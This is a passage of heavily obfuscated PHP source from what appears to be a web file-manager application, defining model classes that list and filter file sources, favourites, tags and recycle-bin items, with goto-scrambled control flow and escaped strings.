"{$E”Äéãà°}\x25")); goto D…ÒğÓ›ğò; BÈ¤† ºØ‚: Model($B˜÷™í™œ[572])->remove($c«ìßÕ¿—ğ); goto D—¥½ì¼ÌÕ; D—¥½ì¼ÌÕ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\114\151\147\x68\164\x41\160\160"; public $modelType = "\123\171\x73\164\145\155\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\147\162\x6f\x75\x70", "\x64\x65\163\x63", "\x63\x6f\x6e\164\x65\x6e\x74"); public function listData($E…İ…¶ãö¡ = false, $B„‹¡ìí¶Ğ = "\155\157\144\151\146\171\x54\151\x6d\145", $Bƒ©‚£Š¤Å = true) { return parent::listData($E…İ…¶ãö¡, $B„‹¡ìí¶Ğ, $Bƒ©‚£Š¤Å); } public function remove($dˆİíÙĞ) { $Fºà­ñëİ” = $this->findByName($dˆİíÙĞ); if (!$Fºà­ñëİ”) { return !1; } return parent::remove($Fºà­ñëİ”[$_SERVER[«¾°Ã¤][393]]); } public function add($F…“Ÿïòµ) { if ($this->findByName($F…“Ÿïòµ[$_SERVER[«¾°Ã¤][28]])) { return !1; } return parent::insert($F…“Ÿïòµ); } public function update($Aƒ¡¹Ëø±, $f“ï¯Ğˆ¡) { $D´Ö£Æ³Ì† =& $_SERVER[«¾°Ã¤]; $a¦‚ùí¹ø¯ = $this->findByName($Aƒ¡¹Ëø±); $e¶»æÏ…Ù÷ = $this->findByName($f“ï¯Ğˆ¡[$D´Ö£Æ³Ì†[28]]); if (!$a¦‚ùí¹ø¯ || $e¶»æÏ…Ù÷ && $e¶»æÏ…Ù÷[$D´Ö£Æ³Ì†[393]] != $a¦‚ùí¹ø¯[$D´Ö£Æ³Ì†[393]]) { return !1; } return parent::update($a¦‚ùí¹ø¯[$D´Ö£Æ³Ì†[393]], $f“ï¯Ğˆ¡); } } goto aë†£ôİ±é; a´ÙÅñ³ªÒ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\143\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\155\145" => "\151\x6f\x5f\163\x6f\x75\162\x63\145\x5f\155\x65\164\x61", "\x6d\145\x74\141\x46\x69\145\x6c\144" => "\x73\x6f\x75\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\x69\155\x65", "\x74\151\x6d\145", "\151\156\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\157\x6e"), array("\x63\162\x65\x61\x74\145\124\x69\155\145", "\x74\x69\155\x65", "\x69\156\163\145\162\164", "\x66\x75\156\x63\x74\151\157\x6e"), array("\x76\151\x65\x77\124\151\x6d\145", "\164\151\155\x65", "\151\x6e\163\145\x72\x74", "\x66\165\156\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CØˆÎÊ£›Â) { return $this->listSource(array($_SERVER[«¾°Ã¤][403] => $CØˆÎÊ£›Â)); } public function typeName($DÑÙ‹í™ ) { static $c®¸º·¡©‰ = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\x67\x72\x6f\x75\x70"); return $c®¸º·¡©‰[$DÑÙ‹í™  . $_SERVER[«¾°Ã¤][33]]; } public function sourceListInfo($d‹ÜÅ†óÄ¤, $a§·¼„„ = false) { goto Bßôëƒ¼ÉÎ; fãÂŞô¡”‹: if (!$d‹ÜÅ†óÄ¤) { return array(); } $f©÷ò”é = $this->where(array($D‘ïÏñê—Á[404] => array($D‘ïÏñê—Á[7], $d‹ÜÅ†óÄ¤)))->select(); $this->_listDataApply($f©÷ò”é, $a§·¼„„); goto dÇÅäª‰È¦; dÇÅäª‰È¦: return array_to_keyvalue($f©÷ò”é, $D‘ïÏñê—Á[404]); goto fØß•ã†×; Bßôëƒ¼ÉÎ: $D‘ïÏñê—Á =& $_SERVER[«¾°Ã¤]; $d‹ÜÅ†óÄ¤ = $d‹ÜÅ†óÄ¤ ? $d‹ÜÅ†óÄ¤ : array(); $d‹ÜÅ†óÄ¤ = array_filter(array_unique($d‹ÜÅ†óÄ¤)); goto fãÂŞô¡”‹; fØß•ã†×: } public function pathInfoFilter(&$b‡£‰³¸¤¨) { goto bÜ©È±¢ß¯; fëóìÜ¨¬: $b‡£‰³¸¤¨ = array_field_key($b‡£‰³¸¤¨, $d×£¥‡ğ˜¶); return $b‡£‰³¸¤¨; goto fŠÀÚ¶Î³‚; EÕ¥¹¶¸×‡: static $fÔ‘­®ì = false; if (!$AĞšƒ¶·´ë) { goto aÇ’Å´àÁ³; a±Œ¯Äª : $Bé¹Ÿëñàš = $c’òÁšéô[408]; $CØÏ‹ôëÓŠ = explode($c’òÁšéô[47], $Bé¹Ÿëñàš); $AĞšƒ¶·´ë = explode($c’òÁšéô[47], $fÕÄ´“‹‚Ò); goto aÈÓÇ˜ò¸–; aÈÓÇ˜ò¸–: $f”åµÎ½ñ¼ = array(); foreach ($AĞšƒ¶·´ë as $eóö‹ËÅÚ‚) { if (in_array($eóö‹ËÅÚ‚, $CØÏ‹ôëÓŠ)) { continue; } $f”åµÎ½ñ¼[] = $eóö‹ËÅÚ‚; } $fÔ‘­®ì = explode($c’òÁšéô[47], $c’òÁšéô[409]); goto cîƒ‹§ÂŠ; aÇ’Å´àÁ³: $fÕÄ´“‹‚Ò = $c’òÁšéô[405]; $fÕÄ´“‹‚Ò .= $c’òÁšéô[406]; $fÕÄ´“‹‚Ò .= $c’òÁšéô[407]; goto a±Œ¯Äª ; cîƒ‹§ÂŠ: } foreach ($fÔ‘­®ì as $aÂ·›ªÒá) { if (isset($b‡£‰³¸¤¨[$aÂ·›ªÒá])) { $b‡£‰³¸¤¨[$aÂ·›ªÒá] = intval($b‡£‰³¸¤¨[$aÂ·›ªÒá]); } } goto a±–¹£‚•ƒ; a±–¹£‚•ƒ: $b‡£‰³¸¤¨[$c’òÁšéô[76]] = $c’òÁšéô[410] . $b‡£‰³¸¤¨[$c’òÁšéô[404]] . $c’òÁšéô[411]; $b‡£‰³¸¤¨[$c’òÁšéô[29]] = $b‡£‰³¸¤¨[$c’òÁšéô[412]] == 1 ? $c’òÁšéô[77] : $c’òÁšéô[193]; $b‡£‰³¸¤¨[$c’òÁšéô[413]] = $this->typeName($b‡£‰³¸¤¨[$c’òÁšéô[413]]); goto B„””›³ßù; B„””›³ßù: if ($b‡£‰³¸¤¨[$c’òÁšéô[412]] != 1) { $b‡£‰³¸¤¨[$c’òÁšéô[168]] = $b‡£‰³¸¤¨[$c’òÁšéô[414]]; unset($b‡£‰³¸¤¨[$c’òÁšéô[414]]); } $d×£¥‡ğ˜¶ = $AĞšƒ¶·´ë; if (isset($b‡£‰³¸¤¨[$c’òÁšéô[415]]) && $b‡£‰³¸¤¨[$c’òÁšéô[415]][$c’òÁšéô[416]] == -1) { $d×£¥‡ğ˜¶ = $f”åµÎ½ñ¼; } goto fëóìÜ¨¬; bÜ©È±¢ß¯: $c’òÁšéô =& $_SERVER[«¾°Ã¤]; static $AĞšƒ¶·´ë = false; static $f”åµÎ½ñ¼ = false; goto EÕ¥¹¶¸×‡; fŠÀÚ¶Î³‚: } public function listUserFav() { goto fÙÜŒÉÆŞ¹; fÙÜŒÉÆŞ¹: $E·ôÛ‹Îˆ =& $_SERVER[«¾°Ã¤]; $D±’àÓ¤Ñô = Model($E·ôÛ‹Îˆ[417])->listData(); $aá›ê¹êĞ = array_filter_by_field($D±’àÓ¤Ñô, $E·ôÛ‹Îˆ[29], $E·ôÛ‹Îˆ[418]); goto Bà¾¯’Üš; D—Å³ëš: foreach ($D±’àÓ¤Ñô as &$C¿Õ“Ú”Æ) { $C¿Õ“Ú”Æ = array($E·ôÛ‹Îˆ[421] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[393]], $E·ôÛ‹Îˆ[422] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[28]], $E·ôÛ‹Îˆ[423] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[76]], $E·ôÛ‹Îˆ[424] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[29]], $E·ôÛ‹Îˆ[425] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[194]], $E·ôÛ‹Îˆ[426] => $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[84]]); if ($C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[29]] == $E·ôÛ‹Îˆ[418] && $fÃùƒæâÃ[$C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[76]]]) { $C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[85]] = $fÃùƒæâÃ[$C¿Õ“Ú”Æ[$E·ôÛ‹Îˆ[76]]]; } } unset($C¿Õ“Ú”Æ); return $D±’àÓ¤Ñô; goto b®¬Á­¨‹×; Bà¾¯’Üš: $aá›ê¹êĞ = array_to_keyvalue($aá›ê¹êĞ, $E·ôÛ‹Îˆ[33], $E·ôÛ‹Îˆ[76]); if ($aá›ê¹êĞ) { $fÃùƒæâÃ = $this->listSource(array($E·ôÛ‹Îˆ[419] => array($E·ôÛ‹Îˆ[420], $aá›ê¹êĞ))); } $fÃùƒæâÃ = array_to_keyvalue($fÃùƒæâÃ[$E·ôÛ‹Îˆ[367]], $E·ôÛ‹Îˆ[404]); goto D—Å³ëš; b®¬Á­¨‹×: } public function listUserTag($Cåó‹¤‰Ç³) { goto f—‰¼àØÊ; cÀ¾‡´Ê„Ô: $E«‘Ë¦¢ÙÓ = array_to_keyvalue($f‚Û°ä‡äÌ[$cê²‘‘›ÕÔ[74]], $cê²‘‘›ÕÔ[33], $cê²‘‘›ÕÔ[404]); $cÛ×‚Í±Ù£ = array_merge($E«‘Ë¦¢ÙÓ, $F‚¡‡ Ïöõ); foreach ($fØÈ¹Á„Æ as $BÓğ¤‚‹¨‡) { if (!in_array($BÓğ¤‚‹¨‡, $cÛ×‚Í±Ù£)) { $B©İåŠõÁ¡[] = $BÓğ¤‚‹¨‡; } } goto c†ÍøµÈÙ; eË’—á‹Á: $BÖ¸‰Ü¡·Ò = array(); foreach ($a¢„ÄÈÇê as $dôÓá“Ú”â) { $BÓğ¤‚‹¨‡ = $dôÓá“Ú”â[$cê²‘‘›ÕÔ[76]]; if (!$BÓğ¤‚‹¨‡) { continue; } if (!isset($BÖ¸‰Ü¡·Ò[$BÓğ¤‚‹¨‡])) { $BÖ¸‰Ü¡·Ò[$BÓğ¤‚‹¨‡] = array(); } $BÖ¸‰Ü¡·Ò[$BÓğ¤‚‹¨‡][] = $dôÓá“Ú”â[$cê²‘‘›ÕÔ[428]]; } $fØÈ¹Á„Æ = array(); goto Cé‡Ÿ†É„”; Cé‡Ÿ†É„”: foreach ($BÖ¸‰Ü¡·Ò as $Fàˆ†¤é‹Ö => $cßˆçæ‚ô·) { $aë×¸††‹ = !0; if (!$Cåó‹¤‰Ç³) { $fØÈ¹Á„Æ[] = $Fàˆ†¤é‹Ö; continue; } foreach ($Cåó‹¤‰Ç³ as $aÃò¾òïÜ´) { if (!in_array($aÃò¾òïÜ´, $cßˆçæ‚ô·)) { $aë×¸††‹ = !1; break; } } if ($aë×¸††‹) { $fØÈ¹Á„Æ[] = $Fàˆ†¤é‹Ö; } } if (!$fØÈ¹Á„Æ) { return array(); } $f‚Û°ä‡äÌ = $this->listSource(array($cê²‘‘›ÕÔ[419] => array($cê²‘‘›ÕÔ[420], $fØÈ¹Á„Æ))); goto eÌ¾´Î÷¨ä; f—‰¼àØÊ: $cê²‘‘›ÕÔ =& $_SERVER[«¾°Ã¤]; if ($Cåó‹¤‰Ç³ && !is_array($Cåó‹¤‰Ç³)) { $Cåó‹¤‰Ç³ = array($Cåó‹¤‰Ç³); } $a¢„ÄÈÇê = Model($cê²‘‘›ÕÔ[427])->listData(); goto eË’—á‹Á; eÌ¾´Î÷¨ä: if (!$f‚Û°ä‡äÌ || count($fØÈ¹Á„Æ) == $f‚Û°ä‡äÌ[$cê²‘‘›ÕÔ[364]][$cê²‘‘›ÕÔ[365]]) { return $f‚Û°ä‡äÌ; } $B©İåŠõÁ¡ = array(); $F‚¡‡ Ïöõ = array_to_keyvalue($f‚Û°ä‡äÌ[$cê²‘‘›ÕÔ[75]], $cê²‘‘›ÕÔ[33], $cê²‘‘›ÕÔ[404]); goto cÀ¾‡´Ê„Ô; c†ÍøµÈÙ: if ($B©İåŠõÁ¡) { Model($cê²‘‘›ÕÔ[429])->removeBySource($B©İåŠõÁ¡); } return $f‚Û°ä‡äÌ; goto A¹ï’ÇŸÌó; A¹ï’ÇŸÌó: } public function listUserRecycle() { $bÏ‡‹õ††Ö =& $_SERVER[«¾°Ã¤]; $C¬ê‹–¬ã¹ = Model($bÏ‡‹õ††Ö[430])->listData(); if (!$C¬ê‹–¬ã¹) { return array(); } $B ÉØå†À = array($bÏ‡‹õ††Ö[419] => array($bÏ‡‹õ††Ö[420], $C¬ê‹–¬ã¹), $bÏ‡‹õ††Ö[431] => 1); return $this->listSource($B ÉØå†À); } public function listSource($c—ä«ò¶, $A®ŞÕ›ëó¿ = 3000) { goto CºìÍâ”ÌÑ; DÔõâ±ÈÈƒ: return $C‘˜•­äšÎ; goto cÁÛ¶Á£ğ¯; CºìÍâ”ÌÑ: $AÓÛˆç­Æ =& $_SERVER[«¾°Ã¤]; if (!isset($c—ä«ò¶[$AÓÛˆç­Æ[432]])) { $c—ä«ò¶[$AÓÛˆç­Æ[432]] = 0; } $cÌòâã¸í = $AÓÛˆç­Æ[433]; goto Eõ¨ÕíÁ±è; Eõ¨ÕíÁ±è: $C‘˜•­äšÎ = $this->field($cÌòâã¸í)->_makeOrder()->where($c—ä«ò¶)->selectPage($A®ŞÕ›ëó¿); $this->_listDataApply($C‘˜•­äšÎ[$AÓÛˆç­Æ[367]]); $this->_listMake($C‘˜•­äšÎ); goto DÔõâ±ÈÈƒ; cÁÛ¶Á£ğ¯: } protected function _makeOrder() { goto dÛá½îóÑÅ; AåÕÄ¨¥ëŠ: $F½ëŸÌçƒ = array($F§‹İÚİêæ[437] => $F§‹İÚİêæ[438], $F§‹İÚİêæ[439] => $F§‹İÚİêæ[440]); $cŸ¢Òâ‡‰Ì = array($F§‹İÚİêæ[28] => $F§‹İÚİêæ[28], $F§‹İÚİêæ[78] => $F§‹İÚİêæ[78], $F§‹İÚİêæ[168] => $F§‹İÚİêæ[414], $F§‹İÚİêæ[441] => $F§‹İÚİêæ[441], $F§‹İÚİêæ[442] => $F§‹İÚİêæ[443], $F§‹İÚİêæ[194] => $F§‹İÚİêæ[194], $F§‹İÚİêæ[84] => $F§‹İÚİêæ[84]); $A¢†¼Š¸ = Input::get($F§‹İÚİêæ[444], $F§‹İÚİêæ[7], $E¹¡êÎ½ŠŞ, array_keys($cŸ¢Òâ‡‰Ì)); goto cäĞó×òƒ; DÄ«í¤¥: if ($A¢†¼Š¸ == $F§‹İÚİêæ[28]) { } $e«½ø˜Úİø = $F§‹İÚİêæ[446] . $cŸ¢Òâ‡‰Ì[$A¢†¼Š¸] . $F§‹İÚİêæ[50] . $F½ëŸÌçƒ[$fİ­©ñ£ÇÀ]; return $this->order(rtrim(trim($e«½ø˜Úİø), $F§‹İÚİêæ[47])); goto CŸğ†Úò; dÛá½îóÑÅ: $F§‹İÚİêæ =& $_SERVER[«¾°Ã¤]; $E¹¡êÎ½ŠŞ = Model($F§‹İÚİêæ[434])->get($F§‹İÚİêæ[435]); $fÍ¸Û¾½ñ± = Model($F§‹İÚİêæ[434])->get($F§‹İÚİêæ[436]); goto AåÕÄ¨¥ëŠ; cäĞó×òƒ: $fİ­©ñ£ÇÀ = Input::get($F§‹İÚİêæ[445], $F§‹İÚİêæ[7], $fÍ¸Û¾½ñ±, array_keys($F½ëŸÌçƒ)); if (!in_array($A¢†¼Š¸, array_keys($cŸ¢Òâ‡‰Ì))) { $A¢†¼Š¸ = $F§‹İÚİêæ[28]; } if (!in_array($fİ­©ñ£ÇÀ, array_keys($F½ëŸÌçƒ))) { $A¢†¼Š¸ = $F§‹İÚİêæ[437]; } goto DÄ«í¤¥; CŸğ†Úò: } protected function _listDataApplyItem($A ¢ö°à, $fè‹òË“±ß = false) { $D§¢ë¶ƒ§é = array($A ¢ö°à); $this->_listDataApply($D§¢ë¶ƒ§é, $fè‹òË“±ß); return $D§¢ë¶ƒ§é[0]; } protected function _listDataApply(&$AÂ‡µæÄíÅ, $bÁµîîİ = false) { goto a˜ÄÈš’ì; FŞ½ªì©ˆ: $this->_listAppendUser($AÂ‡µæÄíÅ); $this->_listFilterInfo($AÂ‡µæÄíÅ, $bÁµîîİ); goto aÆÑšˆíÈÔ; a˜ÄÈš’ì: $aŠ›Û£ê§¾ =& $_SERVER[«¾°Ã¤]; if (!$AÂ‡µæÄíÅ) { $AÂ‡µæÄíÅ = array(); return; } $EÇÚöæÅÊ = array_to_keyvalue($AÂ‡µæÄíÅ, $aŠ›Û£ê§¾[33], $aŠ›Û£ê§¾[404]); goto b…º˜°»; aİ¶ÅÇ©™Ï: $this->_listAppendPath($AÂ‡µæÄíÅ); $this->_listAppendAuth($AÂ‡µæÄíÅ); $this->_listAppendSourceInfo($AÂ‡µæÄíÅ, $EÇÚöæÅÊ); goto FŞ½ªì©ˆ; b…º˜°»: $EÇÚöæÅÊ = array_unique($EÇÚöæÅÊ); $this->_listSourceCache($AÂ‡µæÄíÅ); if (!$bÁµîîİ) { $this->_listAppendMeta($AÂ‡µæÄíÅ, $EÇÚöæÅÊ); $this->_listAppendFileMeta($AÂ‡µæÄíÅ, $EÇÚöæÅÊ); $this->_listAppendChildren($AÂ‡µæÄíÅ, $EÇÚöæÅÊ); } goto aİ¶ÅÇ©™Ï; aÆÑšˆíÈÔ: } protected function _listSourceCache($f­³±Ï”±Œ) { $fÃ„ ¯¯¡¶ =& $_SERVER[«¾°Ã¤]; foreach ($f­³±Ï”±Œ as $EÔ­‰ƒ ›) { self::$cacheSourceInfo[$fÃ„ ¯¯¡¶[447] . $EÔ­‰ƒ ›[$fÃ„ ¯¯¡¶[404]]] = $EÔ­‰ƒ ›; } } protected function _listFilterInfo(&$d‹ÉŠšÂµ·, $bš‰ó•‡·¯ = false) { $Cã÷óØ¶Ğ =& $_SERVER[«¾°Ã¤]; foreach ($d‹ÉŠšÂµ· as &$c‰êîõ´íÚ) { $c‰êîõ´íÚ = $this->pathInfoFilter($c‰êîõ´íÚ); self::$cachePathInfo[$Cã÷óØ¶Ğ[448] . intval($bš‰ó•‡·¯) . $Cã÷óØ¶Ğ[449] . $c‰êîõ´íÚ[$Cã÷óØ¶Ğ[404]]] = $c‰êîõ´íÚ; } unset($c‰êîõ´íÚ); } protected function _listMake(&$F¥Ú¬“½–ç) { $b£´¦™‡‘´ =& $_SERVER[«¾°Ã¤]; $F¥Ú¬“½–ç[$b£´¦™‡‘´[75]] = array(); $F¥Ú¬“½–ç[$b£´¦™‡‘´[74]] = array(); foreach ($F¥Ú¬“½–ç[$b£´¦™‡‘´[367]] as $cè®Ã½³Ÿä) { $b¶ÚĞ²•‰™ = $cè®Ã½³Ÿä[$b£´¦™‡‘´[412]] == 1 ? $b£´¦™‡‘´[75] : $b£´¦™‡‘´[74]; $F¥Ú¬“½–ç[$b¶ÚĞ²•‰™][] = $cè®Ã½³Ÿä; } unset($F¥Ú¬“½–ç[$b£´¦™‡‘´[367]]); } protected function _listAppendMeta(&$E°Ú£øÅõ´, $a–÷İó´«ä) { goto fãëÑÄÛˆ; aº‘ÕØÄŠ‹: if (!$bğø±¶›¶) { return; } $c•¹¬¹´‹‹ = array($fëƒéÍîë[452], $fëƒéÍîë[453]); $F¬ç‹ÑŒáÜ = array(); goto D’½Éš…õ‰; D’½Éš…õ‰: foreach ($bğø±¶›¶ as $B‰§îêÂÚÃ) { if (!isset($F¬ç‹ÑŒáÜ[$B‰§îêÂÚÃ[$fëƒéÍîë[404]]])) { $F¬ç‹ÑŒáÜ[$B‰§îêÂÚÃ[$fëƒéÍîë[404]]] = array(); } if (in_array($B‰§îêÂÚÃ[$fëƒéÍîë[93]], $c•¹¬¹´‹‹)) { continue; } $F¬ç‹ÑŒáÜ[$B‰§îêÂÚÃ[$fëƒéÍîë[404]]][$B‰§îêÂÚÃ[$fëƒéÍîë[93]]] = $B‰§îêÂÚÃ[$fëƒéÍîë[372]]; } foreach ($E°Ú£øÅõ´ as &$D†ì³îğÛ) { $D†ì³îğÛ[$fëƒéÍîë[454]] = !1; if (isset($F¬ç‹ÑŒáÜ[$D†ì³îğÛ[$fëƒéÍîë[404]]])) { $D†ì³îğÛ[$fëƒéÍîë[454]] = $F¬ç‹ÑŒáÜ[$D†ì³îğÛ[$fëƒéÍîë[404]]]; } if ($this->fileIsLock($D†ì³îğÛ) && $D†ì³îğÛ[$fëƒéÍîë[415]]) { $f½¥îæè“ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $D†ì³îğÛ[$fëƒéÍîë[415]][$fëƒéÍîë[416]] = AuthModel::authDisable($D†ì³îğÛ[$fëƒéÍîë[415]][$fëƒéÍîë[416]], $f½¥îæè“); $D†ì³îğÛ[$fëƒéÍîë[415]][$fëƒéÍîë[455]][$fëƒéÍîë[415]] = $D†ì³îğÛ[$fëƒéÍîë[415]][$fëƒéÍîë[416]]; } } unset($D†ì³îğÛ); goto dô‘¦Êƒ“´; fãëÑÄÛˆ: $fëƒéÍîë =& $_SERVER[«¾°Ã¤]; $dœ­™å–“Ô = array($fëƒéÍîë[419] => array($fëƒéÍîë[420], $a–÷İó´«ä)); $bğø±¶›¶ = Model($fëƒéÍîë[450])->field($fëƒéÍîë[451])->where($dœ­™å–“Ô)->select(); goto aº‘ÕØÄŠ‹; dô‘¦Êƒ“´: } protected function _listAppendFileMeta(&$f¼šŠ‰Ôœ, $e½²èïÁÙã) { goto DêãĞÒÎß“; AĞÉŒ… »õ: $Dàç³Ì°‚‚ = $Dàç³Ì°‚‚ ? $Dàç³Ì°‚‚ : array(); $F§†ğ»¯„Š = array(); foreach ($Dàç³Ì°‚‚ as $Cò»§¼Ì×) { if (!isset($F§†ğ»¯„Š[$Cò»§¼Ì×[$DéÊ½åÇƒŞ[456]]])) { $F§†ğ»¯„Š[$Cò»§¼Ì×[$DéÊ½åÇƒŞ[456]]] = array(); } $F§†ğ»¯„Š[$Cò»§¼Ì×[$DéÊ½åÇƒŞ[456]]][$Cò»§¼Ì×[$DéÊ½åÇƒŞ[93]]] = $Cò»§¼Ì×[$DéÊ½åÇƒŞ[372]]; } goto E¬«Áˆ¬‚º; E¬«Áˆ¬‚º: foreach ($f¼šŠ‰Ôœ as &$DÂä¤Ú´ñ) { goto D¡íª„„×­; aÀÃ›Ê¸ÜÂ: unset($eŸê‡Ê÷Ó[$DôÓˆÏÓ°¾][$DéÊ½åÇƒŞ[76]]); $b“ŠÙ÷å‘â = is_array($F§†ğ»¯„Š[$DôÓˆÏÓ°¾]) ? $F§†ğ»¯„Š[$DôÓˆÏÓ°¾] : array(); $DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[164]] = array_merge($b“ŠÙ÷å‘â, $eŸê‡Ê÷Ó[$DôÓˆÏÓ°¾]); goto eù¹Ì¾ˆ¦„; D¡íª„„×­: $DôÓˆÏÓ°¾ = $DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[456]]; if (!$DôÓˆÏÓ°¾ || !is_array($eŸê‡Ê÷Ó[$DôÓˆÏÓ°¾])) { continue; } $aè»ç¡ã¦– = $eŸê‡Ê÷Ó[$DôÓˆÏÓ°¾]; goto CÀÆ©Ÿ»õ ; CÀÆ©Ÿ»õ : $aè»ç¡ã¦–[$DéÊ½åÇƒŞ[78]] = $DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[78]]; $aè»ç¡ã¦–[$DéÊ½åÇƒŞ[28]] = $DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[28]]; if (!isset(self::$cacheFileInfo[$DéÊ½åÇƒŞ[462] . $DôÓˆÏÓ°¾])) { self::$cacheFileInfo[$DéÊ½åÇƒŞ[462] . $DôÓˆÏÓ°¾] = array_merge(array(), $aè»ç¡ã¦–); } goto aÀÃ›Ê¸ÜÂ; eù¹Ì¾ˆ¦„: if (isset($DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[164]][$DéÊ½åÇƒŞ[163]])) { $DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[163]] = json_decode($DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[164]][$DéÊ½åÇƒŞ[163]], !0); unset($DÂä¤Ú´ñ[$DéÊ½åÇƒŞ[164]][$DéÊ½åÇƒŞ[163]]); } goto C”àÆÛ´ì; C”àÆÛ´ì: } unset($DÂä¤Ú´ñ); goto c‰×‡ö”; DêãĞÒÎß“: $DéÊ½åÇƒŞ =& $_SERVER[«¾°Ã¤]; $dç¾ µº•Æ = array_to_keyvalue($f¼šŠ‰Ôœ, $DéÊ½åÇƒŞ[33], $DéÊ½åÇƒŞ[456]); $dç¾ µº•Æ = array_filter(array_unique($dç¾ µº•Æ)); goto AĞŸ¼á¶ï±; FšªÉÔˆ¨é: $eŸê‡Ê÷Ó = Model($DéÊ½åÇƒŞ[459])->field($AÓ©âÎ‡“)->where($eöèÊ¯½¬½)->select(); $eŸê‡Ê÷Ó = array_to_keyvalue($eŸê‡Ê÷Ó, $DéÊ½åÇƒŞ[456]); $Dàç³Ì°‚‚ = Model($DéÊ½åÇƒŞ[460])->field($DéÊ½åÇƒŞ[461])->where($eöèÊ¯½¬½)->select(); goto AĞÉŒ… »õ; AĞŸ¼á¶ï±: if (!$dç¾ µº•Æ) { return; } $eöèÊ¯½¬½ = array($DéÊ½åÇƒŞ[457] => array($DéÊ½åÇƒŞ[420], $dç¾ µº•Æ)); $AÓ©âÎ‡“ = $DéÊ½åÇƒŞ[458]; goto FšªÉÔˆ¨é; c‰×‡ö”: } protected function _listAppendSourceInfo(&$A¾·ØÄ£–Ñ, $cŒøØ”¸’) { goto f²Ë‰‚ÌæÈ; f²Ë‰‚ÌæÈ: $Eøã‡òÙ÷ =& $_SERVER[«¾°Ã¤]; if (!defined($Eøã‡òÙ÷[463])) { return; } $c¡¤¶ğ¾Œ = Model($Eøã‡òÙ÷[464])->listData(); goto Dº˜¿›ÒÁ´; c‚¯ö‡Áœ: return $A¾·ØÄ£–Ñ; goto aß‘×µ·µË; Dº˜¿›ÒÁ´: $fÙîùĞ¸õ = Model($Eøã‡òÙ÷[427])->listData(); $a£ØŞá«ÈÎ = Model($Eøã‡òÙ÷[417])->listData(); $F«£êùÊ = Model($Eøã‡òÙ÷[465])->listSimple(); goto d•Û­çéƒ; bµñ„ë©Ü‰: $f©Ùï°“•È = array_to_keyvalue_group($F«£êùÊ, $Eøã‡òÙ÷[404]); foreach ($A¾·ØÄ£–Ñ as &$aõ‡ñ•ø¤) { $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]] = array($Eøã‡òÙ÷[466] => 0, $Eøã‡òÙ÷[467] => 0, $Eøã‡òÙ÷[468] => 0); if (isset($C²ê“§Î—•[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]])) { $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[469]] = 1; $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[470]] = $C²ê“§Î—•[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]][$Eøã‡òÙ÷[28]]; } if (isset($c´ÕŠáñ[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]])) { $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[471]] = array(); foreach ($c´ÕŠáñ[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]] as $EÓö ¬¸Õæ) { $EÀ°‰í÷·„ = $A‚Åã·Ó‹ˆ[$EÓö ¬¸Õæ]; $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[471]][] = array($Eøã‡òÙ÷[472] => $EÀ°‰í÷·„[$Eøã‡òÙ÷[393]], $Eøã‡òÙ÷[422] => $EÀ°‰í÷·„[$Eøã‡òÙ÷[28]], $Eøã‡òÙ÷[473] => $EÀ°‰í÷·„[$Eøã‡òÙ÷[474]]); } } if (isset($f©Ùï°“•È[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]])) { $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[475]] = array(); foreach ($f©Ùï°“•È[$aõ‡ñ•ø¤[$Eøã‡òÙ÷[404]]] as $c ©¹Ñé) { $aõ‡ñ•ø¤[$Eøã‡òÙ÷[85]][$Eøã‡òÙ÷[475]] = array($Eøã‡òÙ÷[476] => $c ©¹Ñé[$Eøã‡òÙ÷[477]], $Eøã‡òÙ÷[478] => $c ©¹Ñé[$Eøã‡òÙ÷[479]], $Eøã‡òÙ÷[480] => $c ©¹Ñé[$Eøã‡òÙ÷[404]], $Eøã‡òÙ÷[481] => $c ©¹Ñé[$Eøã‡òÙ÷[482]], $Eøã‡òÙ÷[483] => $c ©¹Ñé[$Eøã‡òÙ÷[484]], $Eøã‡òÙ÷[485] => $c ©¹Ñé[$Eøã‡òÙ÷[485]], $Eøã‡òÙ÷[486] => $c ©¹Ñé[$Eøã‡òÙ÷[486]]); } } } unset($aõ‡ñ•ø¤); goto c‚¯ö‡Áœ; d•Û­çéƒ: $A‚Åã·Ó‹ˆ = 